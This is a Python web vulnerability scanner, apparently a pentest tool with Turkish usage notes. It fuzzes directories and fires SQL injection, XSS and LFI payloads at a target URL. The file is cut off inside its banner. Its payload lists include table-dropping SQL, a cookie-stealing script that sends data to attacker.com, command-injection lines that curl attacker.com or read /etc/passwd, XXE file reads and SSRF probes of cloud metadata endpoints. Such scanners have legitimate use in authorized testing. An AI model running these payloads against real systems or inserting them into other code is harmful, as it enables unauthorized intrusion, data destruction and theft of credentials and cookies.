#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
║              ULTRA ADVANCED WEB VULNERABILITY SCANNER              ║
║               Professional Penetration Testing Tool                ║
 ════════════════════════════════════════════════════════════════════


python3 ultra_scanner.py -u https://target.com -w medium.txt

# Basit scan
python3 ultra_scanner.py -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Hızlı ve agresif scan
python3 ultra_scanner.py -u https://target.com -w wordlist.txt -t 200 --delay 0

# Vulnerability scanning ile
python3 ultra_scanner.py -u https://target.com -w wordlist.txt --vuln

# Custom extensions
python3 ultra_scanner.py -u https://target.com -w wordlist.txt -e php asp aspx jsp

# Proxy ile (Burp Suite)
python3 ultra_scanner.py -u https://target.com -w wordlist.txt --proxy http://127.0.0.1:8080

# Full scan (tüm özellikler)
python3 ultra_scanner.py -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --vuln --random-agent -o report.txt
"""
import os
import sys
import re
import json
import time
import hashlib
import random
import string
import threading
import argparse
import requests
import urllib3
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from requests.exceptions import RequestException, Timeout, ConnectionError
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ════════════════════════════════════════════════════════════════════════════
#                            COLOR CONSTANTS
# ════════════════════════════════════════════════════════════════════════════

class Colors:
    """ANSI color codes"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[97m'
    MAGENTA = '\033[35m'
    
    @staticmethod
    def disable():
        """Disable colors"""
        Colors.HEADER = ''
        Colors.BLUE = ''
        Colors.CYAN = ''
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.RED = ''
        Colors.ENDC = ''
        Colors.BOLD = ''
        Colors.UNDERLINE = ''

# ════════════════════════════════════════════════════════════════════════════
#                         PAYLOAD DATABASES
# ════════════════════════════════════════════════════════════════════════════

class PayloadDatabase:
    """Comprehensive payload database for vulnerability testing"""
    
    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "admin' AND 1=0 UNION ALL SELECT 'admin', '5f4dcc3b5aa765d61d8327deb882cf99",
        "1' AND SLEEP(5)--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' WAITFOR DELAY '00:00:05'--",
        "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --",
        "1'; DROP TABLE users--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
        "><marquee><img src=x onerror=confirm(1)></marquee>",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>"
    ]
    
    LFI_PAYLOADS = [
        "../",
        "../../",
        "../../../",
        "../../../../",
        "../../../../../",
        "../../../../../../",
        "../../../../../../../",
        "../../../../../../../../",
        "../../../../../../../../../",
        "../../../../../../../../../../",
        "/etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/motd",
        "/etc/issue",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\system.ini",
        "../../../../../../windows/win.ini",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "file:///etc/passwd"
    ]
    
    COMMAND_INJECTION = [
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "; id",
        "| id",
        "& id",
        "&& id",
        "; whoami",
        "| whoami",
        "& whoami",
        "&& whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; sleep 5",
        "| sleep 5",
        "`id`",
        "$(id)",
        "`whoami`",
        "$(whoami)",
        "; ping -c 5 127.0.0.1",
        "| ping -c 5 127.0.0.1",
        "; curl http://attacker.com",
        "| curl http://attacker.com"
    ]
    
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'
    ]
    
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://0.0.0.0",
        "http://[::1]",
        "http://2130706433",
        "http://017700000001",
        "http://localhost:22",
        "http://localhost:3306",
        "http://localhost:6379",
        "http://localhost:9200"
    ]
    
    SENSITIVE_FILES = [
        ".git/config",
        ".git/HEAD",
        ".env",
        ".env.local",
        ".env.production",
        ".env.development",
        "config.php",
        "wp-config.php",
        "database.yml",
        "web.config",
        ".htaccess",
        "phpinfo.php",
        "info.php",
        "test.php",
        "adminer.php",
        "phpmyadmin/",
        "pma/",
        "admin.php",
        "login.php",
        "administrator/",
        "backup.sql",
        "dump.sql",
        "database.sql",
        "db.sql",
        "backup.zip",
        "backup.tar.gz",
        "site.zip",
        "application.properties",
        "application.yml",
        "settings.py",
        "config.json",
        ".DS_Store",
        "composer.json",
        "package.json",
        "yarn.lock",
        "Gemfile",
        "Gemfile.lock",
        "robots.txt",
        "sitemap.xml",
        ".well-known/security.txt",
        "crossdomain.xml",
        "clientaccesspolicy.xml"
    ]

# ════════════════════════════════════════════════════════════════════════════
#                         ADVANCED HTTP CLIENT
# ════════════════════════════════════════════════════════════════════════════

class AdvancedHTTPClient:
    """Advanced HTTP client with retry logic and session management"""
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
    ]
    
    def __init__(self, timeout=10, max_retries=3, proxy=None, random_agent=False):
        self.timeout = timeout
        self.max_retries = max_retries
        self.proxy = proxy
        self.random_agent = random_agent
        self.session = self._create_session()
    
    def _create_session(self):
        """Create requests session with retry logic"""
        session = requests.Session()
        
        # Retry strategy
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        return session
    
    def get_headers(self, custom_headers=None):
        """Generate request headers"""
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "DNT": "1"
        }
        
        # User-Agent
        if self.random_agent:
            headers["User-Agent"] = random.choice(self.USER_AGENTS)
        else:
            headers["User-Agent"] = self.USER_AGENTS[0]
        
        # Merge custom headers
        if custom_headers:
            headers.update(custom_headers)
        
        return headers
    
    def request(self, method, url, **kwargs):
        """Make HTTP request"""
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('verify', False)
        kwargs.setdefault('allow_redirects', True)
        
        if self.proxy:
            kwargs['proxies'] = {'http': self.proxy, 'https': self.proxy}
        
        if 'headers' not in kwargs:
            kwargs['headers'] = self.get_headers()
        
        try:
            return self.session.request(method, url, **kwargs)
        except Exception as e:
            return None

# ════════════════════════════════════════════════════════════════════════════
#                       DIRECTORY FUZZER (CORE MODULE)
# ════════════════════════════════════════════════════════════════════════════

class UltraDirectoryFuzzer:
    """Advanced directory and file fuzzer with intelligent detection"""
    
    def __init__(self, base_url, wordlist_file, options):
        self.base_url = base_url.rstrip('/')
        self.wordlist_file = wordlist_file
        self.options = options
        
        # Results storage
        self.found_paths = []
        self.sensitive_files = []
        self.potential_vulns = []
        self.scanned_count = 0
        self.lock = threading.Lock()
        
        # HTTP client
        self.client = AdvancedHTTPClient(
            timeout=options.get('timeout', 10),
            max_retries=options.get('retries', 3),
            proxy=options.get('proxy'),
            random_agent=options.get('random_agent', False)
        )
        
        # Configuration
        self.max_threads = options.get('threads', 50)
        self.extensions = options.get('extensions', ['', '.php', '.asp', '.aspx', '.jsp', '.html', '.js', '.json', '.xml', '.txt', '.bak', '.old', '.zip'])
        self.interesting_codes = options.get('status_codes', [200, 201, 204, 301, 302, 303, 307, 308, 401, 403, 405, 500, 503])
        self.exclude_codes = options.get('exclude_codes', [404])
        self.delay = options.get('delay', 0)
        
        # Smart filtering
        self.baseline_lengths = set()
        self.false_positive_threshold = 3
    
    def load_wordlist(self):
        """Load wordlist with validation"""
        if not os.path.exists(self.wordlist_file):
            print(f"{Colors.RED}[!] Wordlist not found: {self.wordlist_file}{Colors.ENDC}")
            return []
        
        wordlist = []
        try:
            with open(self.wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    word = line.strip()
                    if word and not word.startswith('#'):
                        wordlist.append(word)
            
            print(f"{Colors.GREEN}[✓] Loaded {len(wordlist)} words from wordlist{Colors.ENDC}")
            
            # Generate paths with extensions
            paths = []
            for word in wordlist:
                for ext in self.extensions:
                    paths.append(f"{word}{ext}")
            
            print(f"{Colors.CYAN}[*] Total paths to scan: {len(paths)}{Colors.ENDC}")
            return paths
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.ENDC}")
            return []
    
    def check_path(self, path):
        """Check single path for existence and vulnerabilities"""
        try:
            target_url = urljoin(self.base_url + '/', path)
            
            # Add delay if configured
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Make request
            response = self.client.request('GET', target_url)
            
            if not response:
                return
            
            status = response.status_code
            content_length = len(response.content)
            
            with self.lock:
                self.scanned_count += 1
            
            # Skip excluded status codes
            if status in self.exclude_codes:
                return
            
            # Check if interesting
            if status in self.interesting_codes:
                # Smart false positive detection
                if self._is_likely_false_positive(status, content_length):
                    return
                
                result = {
                    'url': target_url,
                    'path': path,
                    'status': status,
                    'length': content_length,
                    'redirect': response.headers.get('Location', ''),
                    'server': response.headers.get('Server', 'Unknown'),
                    'content_type': response.headers.get('Content-Type', ''),
                    'powered_by': response.headers.get('X-Powered-By', ''),
                    'body': response.text[:500] if len(response.text) < 500 else response.text[:500] + '...'
                }
                
                with self.lock:
                    self.found_paths.append(result)
                    
                    # Check for sensitive files
                    if self._is_sensitive_file(path, response):
                        self.sensitive_files.append(result)
                        print(f"{Colors.RED}[!!! SENSITIVE] {target_url} [{status}] (Size: {content_length}){Colors.ENDC}")
                    else:
                        self._print_result(result)
                    
                    # Detect potential vulnerabilities
                    vulns = self._detect_vulnerabilities(result, response)
                    if vulns:
                        self.potential_vulns.extend(vulns)
            
            # Progress indicator
            if self.scanned_count % 100 == 0 and not self.options.get('quiet'):
                print(f"{Colors.CYAN}[*] Progress: {self.scanned_count} paths scanned...{Colors.ENDC}")
                
        except Timeout:
            pass
        except ConnectionError:
            pass
        except RequestException:
            pass
        except Exception as e:
            if self.options.get('verbose'):
                print(f"{Colors.RED}[!] Error: {e}{Colors.ENDC}")
    
    def _is_likely_false_positive(self, status, length):
        """Detect false positives based on response patterns"""
        # Record baseline lengths for 404s
        if status == 404:
            self.baseline_lengths.add(length)
            return True
        
        # If response matches common 404 length, likely false positive
        if length in self.baseline_lengths:
            return True
        
        return False
    
    def _is_sensitive_file(self, path, response):
        """Check if file is sensitive"""
        sensitive_patterns = [
            '.git', '.env', 'config', 'database', 'backup', '.sql', '.db',
            'admin', 'phpmyadmin', 'wp-config', 'web.config', '.htaccess'
        ]
        
        path_lower = path.lower()
        return any(pattern in path_lower for pattern in sensitive_patterns)
    
    def _detect_vulnerabilities(self, result, response):
        """Detect potential vulnerabilities in response"""
        vulns = []
        body = response.text.lower()
        
        # SQL Error Detection
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'mysqli_', 'pg_query', 'odbc_exec',
            'sqlite_query', 'warning: mysql', 'syntax error', 'unclosed quotation',
            'quoted string not properly terminated'
        ]
        if any(error in body for error in sql_errors):
            vulns.append({
                'type': 'SQL Error Disclosure',
                'severity': 'HIGH',
                'url': result['url'],
                'evidence': 'SQL error messages detected in response'
            })
        
        # Directory Listing Detection
        if '<title>index of' in body or 'directory listing' in body:
            vulns.append({
                'type': 'Directory Listing',
                'severity': 'MEDIUM',
                'url': result['url'],
                'evidence': 'Directory listing enabled'
            })
        
        # phpinfo() Detection
        if 'phpinfo()' in body or 'php version' in body:
            vulns.append({
                'type': 'Information Disclosure',
                'severity': 'MEDIUM',
                'url': result['url'],
                'evidence': 'phpinfo() page detected'
            })
        
        # Debug/Stack Trace Detection
        debug_patterns = ['traceback', 'stack trace', 'debug mode', 'line \\d+ in']
        if any(re.search(pattern, body) for pattern in debug_patterns):
            vulns.append({
                'type': 'Debug Information Disclosure',
                'severity': 'LOW',
                'url': result['url'],
                'evidence': 'Debug/stack trace information exposed'
            })
        
        return vulns
    
    def _print_result(self, result):
        """Print scan result with color coding"""
        status = result['status']
        
        # Color based on status
        if status == 200:
            color = Colors.GREEN
        elif status in [301, 302, 303, 307, 308]:
            color = Colors.BLUE
        elif status in [401, 403]:
            color = Colors.YELLOW
        elif status in [500, 503]:
            color = Colors.RED
        else:
            color = Colors.WHITE
        
        output = f"[{color}{status}{Colors.ENDC}] {result['url']}"
        output += f" ({Colors.CYAN}Size: {result['length']}{Colors.ENDC})"
        
        if result['redirect']:
            output += f" → {Colors.MAGENTA}{result['redirect']}{Colors.ENDC}"
        
        if result['server'] != 'Unknown':
            output += f" [{Colors.YELLOW}{result['server']}{Colors.ENDC}]"
        
        print(output)
    
    def scan(self):
        """Start scanning"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.YELLOW}[PHASE 1] Directory & File Discovery{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}\n")
        
        paths = self.load_wordlist()
        if not paths:
            return
        
        start_time = time.time()
        
        # ThreadPool scanning
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self.check_path, path): path for path in paths}
            
            try:
                for future in as_completed(futures):
                    future.result()
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.ENDC}")
                executor.shutdown(wait=False)
        
        duration = time.time() - start_time
        
        # Summary
        self._print_summary(duration)
        
        return self.found_paths
    
    def _print_summary(self, duration):
        """Print scan summary"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.GREEN}[✓] Directory Fuzzing Completed{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}\n")
        
        print(f"{Colors.YELLOW}[*] Scan Duration: {duration:.2f} seconds{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Total Scanned: {self.scanned_count} paths{Colors.ENDC}")
        print(f"{Colors.GREEN}[*] Found Paths: {len(self.found_paths)}{Colors.ENDC}")
        print(f"{Colors.RED}[*] Sensitive Files: {len(self.sensitive_files)}{Colors.ENDC}")
        print(f"{Colors.MAGENTA}[*] Potential Vulnerabilities: {len(self.potential_vulns)}{Colors.ENDC}\n")
        
        # Group by status
        status_groups = defaultdict(list)
        for result in self.found_paths:
            status_groups[result['status']].append(result)
        
        print(f"{Colors.BOLD}Results by Status Code:{Colors.ENDC}")
        for status in sorted(status_groups.keys()):
            count = len(status_groups[status])
            print(f"{Colors.CYAN}  ├─ {status}: {count} results{Colors.ENDC}")

# ════════════════════════════════════════════════════════════════════════════
#                    VULNERABILITY SCANNER (ADVANCED MODULE)
# ════════════════════════════════════════════════════════════════════════════

class VulnerabilityScanner:
    """Advanced vulnerability scanner with multiple attack vectors"""
    
    def __init__(self, base_url, options):
        self.base_url = base_url
        self.options = options
        self.client = AdvancedHTTPClient(timeout=options.get('timeout', 10))
        self.vulnerabilities = []
        self.lock = threading.Lock()
    
    def scan_sql_injection(self, url, params=None):
        """Test for SQL injection vulnerabilities"""
        print(f"\n{Colors.YELLOW}[*] Testing SQL Injection on: {url}{Colors.ENDC}")
        
        test_points = []
        
        # URL parameters
        if '?' in url:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            for param in query_params:
                test_points.append(('url', param, url))
        
        # Test each point
        for point_type, param_name, test_url in test_points:
            for payload in PayloadDatabase.SQL_INJECTION[:10]:  # Test first 10 payloads
                try:
                    if point_type == 'url':
                        parsed = urlparse(test_url)
                        params = parse_qs(parsed.query)
                        params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    
                    response = self.client.request('GET', test_url)
                    
                    if response and self._detect_sql_error(response.text):
                        vuln = {
                            'type': 'SQL Injection',
                            'severity': 'CRITICAL',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': 'SQL error messages detected'
                        }
                        
                        with self.lock:
                            self.vulnerabilities.append(vuln)
                        
                        print(f"{Colors.RED}[!!! CRITICAL] SQL Injection found!{Colors.ENDC}")
                        print(f"{Colors.YELLOW}    URL: {test_url}{Colors.ENDC}")
                        print(f"{Colors.YELLOW}    Parameter: {param_name}{Colors.ENDC}")
                        print(f"{Colors.YELLOW}    Payload: {payload}{Colors.ENDC}")
                        
                        return  # Stop testing this parameter
                
                except Exception:
                    pass
    
    def scan_xss(self, url):
        """Test for Cross-Site Scripting vulnerabilities"""
        print(f"\n{Colors.YELLOW}[*] Testing XSS on: {url}{Colors.ENDC}")
        
        if '?' not in url:
            return
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in PayloadDatabase.XSS_PAYLOADS[:5]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.client.request('GET', test_url)
                    
                    if response and payload in response.text:
                        vuln = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'HIGH',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': 'Payload reflected in response'
                        }
                        
                        with self.lock:
                            self.vulnerabilities.append(vuln)
                        
                        print(f"{Colors.RED}[!!! HIGH] XSS vulnerability found!{Colors.ENDC}")
                        print(f"{Colors.YELLOW}    URL: {test_url}{Colors.ENDC}")
                        print(f"{Colors.YELLOW}    Parameter: {param_name}{Colors.ENDC}")
                        
                        return
                
                except Exception:
                    pass
    
    def scan_lfi(self, url):
        """Test for Local File Inclusion vulnerabilities"""
        print(f"\n{Colors.YELLOW}[*] Testing LFI on: {url}{Colors.ENDC}")
        
        if '?' not in url:
            return
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in PayloadDatabase.LFI_PAYLOADS[:10]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.client.request('GET', test_url)
                    
                    if response and self._detect_lfi_success(response.text):
                        vuln = {
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'CRITICAL',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': 'File contents detected in response'
                        }
                        
                        with self.lock:
                            self.vulnerabilities.append(vuln)
                        
                        print(f"{Colors.RED}[!!! CRITICAL] LFI vulnerability found!{Colors.ENDC}")
                        print(f"{Colors.YELLOW}    URL: {test_url}{Colors.ENDC}")
                        
                        return
                
                except Exception:
                    pass
    
    def _detect_sql_error(self, text):
        """Detect SQL errors in response"""
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'mysqli_', 'pg_query',
            'odbc_exec', 'sqlite_query', 'warning: mysql', 'syntax error',
            'unclosed quotation', 'quoted string not properly terminated',
            'ora-', 'microsoft ole db provider', 'driver'
        ]
        
        text_lower = text.lower()
        return any(error in text_lower for error in sql_errors)
    
    def _detect_lfi_success(self, text):
        """Detect successful LFI exploitation"""
        lfi_indicators = [
            'root:x:0:0:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
            '[boot loader]', '[operating systems]',  # Windows boot.ini
            '# hosts file', 'localhost',  # /etc/hosts
            'for 16-bit app support'  # Windows win.ini
        ]
        
        text_lower = text.lower()
        return any(indicator in text_lower for indicator in lfi_indicators)
    
    def scan_all(self, found_paths):
        """Run all vulnerability scans"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.YELLOW}[PHASE 2] Vulnerability Scanning{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'═'*70}{Colors.ENDC}")
        
        # Scan each found path
        for result in (found_paths or [])[:20]:  # Limit to first 20 to avoid long scans
            url = result['url']
            
            # SQL Injection
            self.scan_sql_injection(url)
            
            # XSS
            self.scan_xss(url)
            
            # LFI
            self.scan_lfi(url)
        
        # Summary
        print(f"\n{Colors.BOLD}{Colors.GREEN}[✓] Vulnerability Scanning Completed{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Total Vulnerabilities Found: {len(self.vulnerabilities)}{Colors.ENDC}\n")
        
        # Display vulnerabilities
        if self.vulnerabilities:
            print(f"{Colors.BOLD}Vulnerabilities Detected:{Colors.ENDC}")
            for vuln in self.vulnerabilities:
                severity_color = Colors.RED if vuln['severity'] == 'CRITICAL' else Colors.YELLOW
                print(f"{severity_color}  [{vuln['severity']}] {vuln['type']}{Colors.ENDC}")
                print(f"{Colors.CYAN}    URL: {vuln['url']}{Colors.ENDC}")
                if 'parameter' in vuln:
                    print(f"{Colors.CYAN}    Parameter: {vuln['parameter']}{Colors.ENDC}")
                print(f"{Colors.WHITE}    Evidence: {vuln['evidence']}{Colors.ENDC}\n")
        
        return self.vulnerabilities

# ════════════════════════════════════════════════════════════════════════════
#                         REPORT GENERATOR
# ════════════════════════════════════════════════════════════════════════════

class ReportGenerator:
    """Generate comprehensive scan reports"""
    
    def __init__(self, output_dir='output'):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_txt_report(self, target, found_paths, sensitive_files, vulnerabilities, duration):
        """Generate text report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(self.output_dir, f"scan_report_{timestamp}.txt")
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("═" * 80 + "\n")
            f.write(" " * 20 + "ULTRA SCANNER - SECURITY SCAN REPORT\n")
            f.write("═" * 80 + "\n\n")
            
            f.write(f"Target: {target}\n")
            f.write(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Duration: {duration:.2f} seconds\n\n")
            
            f.write("─" * 80 + "\n")
            f.write("SUMMARY\n")
            f.write("─" * 80 + "\n")
            f.write(f"Total Paths Found: {len(found_paths or [])}\n")
            f.write(f"Sensitive Files: {len(sensitive_files)}\n")
            f.write(f"Vulnerabilities: {len(vulnerabilities)}\n\n")
            
            if found_paths:
                f.write("─" * 80 + "\n")
                f.write("DISCOVERED PATHS\n")
                f.write("─" * 80 + "\n")
                for result in found_paths:
                    f.write(f"[{result['status']}] {result['url']} (Size: {result['length']})\n")
                    if result['redirect']:
                        f.write(f"  → Redirects to: {result['redirect']}\n")
                    if result['server'] != 'Unknown':
                        f.write(f"  → Server: {result['server']}\n")
                f.write("\n")
            
            if sensitive_files:
                f.write("─" * 80 + "\n")
                f.write("SENSITIVE FILES DETECTED\n")
                f.write("─" * 80 + "\n")
                for result in sensitive_files:
                    f.write(f"[!!!] {result['url']}\n")
                f.write("\n")
            
            if vulnerabilities:
                f.write("─" * 80 + "\n")
                f.write("VULNERABILITIES\n")
                f.write("─" * 80 + "\n")
                for vuln in vulnerabilities:
                    f.write(f"[{vuln['severity']}] {vuln['type']}\n")
                    f.write(f"  URL: {vuln['url']}\n")
                    if 'parameter' in vuln:
                        f.write(f"  Parameter: {vuln['parameter']}\n")
                    if 'payload' in vuln:
                        f.write(f"  Payload: {vuln['payload']}\n")
                    f.write(f"  Evidence: {vuln['evidence']}\n\n")
        
        return filename
    
    def generate_json_report(self, target, found_paths, sensitive_files, vulnerabilities, duration):
        """Generate JSON report"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(self.output_dir, f"scan_report_{timestamp}.json")
        
        report = {
            'target': target,
            'scan_time': datetime.now().isoformat(),
            'duration': duration,
            'summary': {
                'total_paths': len(found_paths or []),
                'sensitive_files': len(sensitive_files),
                'vulnerabilities': len(vulnerabilities)
            },
            'discovered_paths': found_paths,
            'sensitive_files': sensitive_files,
            'vulnerabilities': vulnerabilities
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        
        return filename

# ════════════════════════════════════════════════════════════════════════════
#                              MAIN SCANNER
# ════════════════════════════════════════════════════════════════════════════

class UltraScanner:
    """Main scanner orchestrator"""
    
    def __init__(self, options):
        self.options = options
        self.start_time = None
        self.results = {
            'found_paths': [],
            'sensitive_files': [],
            'vulnerabilities': []
        }
    
    def print_banner(self):
        """Display banner"""
        banner = f"""{Colors.CYAN}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║    ██╗   ██╗██╗  ████████╗██████╗  █████╗     ███████╗ ██████╗ █████╗   ║
║    ██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗  ║
║    ██║   ██║██║     ██║   ██████╔╝███████║    ███████╗██║     ███████║  ║
║    ██║   ██║██║     ██║   ██╔══██╗██╔══██║    ╚════██║██║     ██╔══██║  ║
║    ╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ███████║╚██████╗██║  ██║  ║
║     ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝  ║
║                                                                           ║
║              ULTRA ADVANCED WEB VULNERABILITY SCANNER v3.0                ║
║                    Professional Penetration Testing Tool                  ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝

{Colors.GREEN}[*] Modules Loaded:{Colors.ENDC}
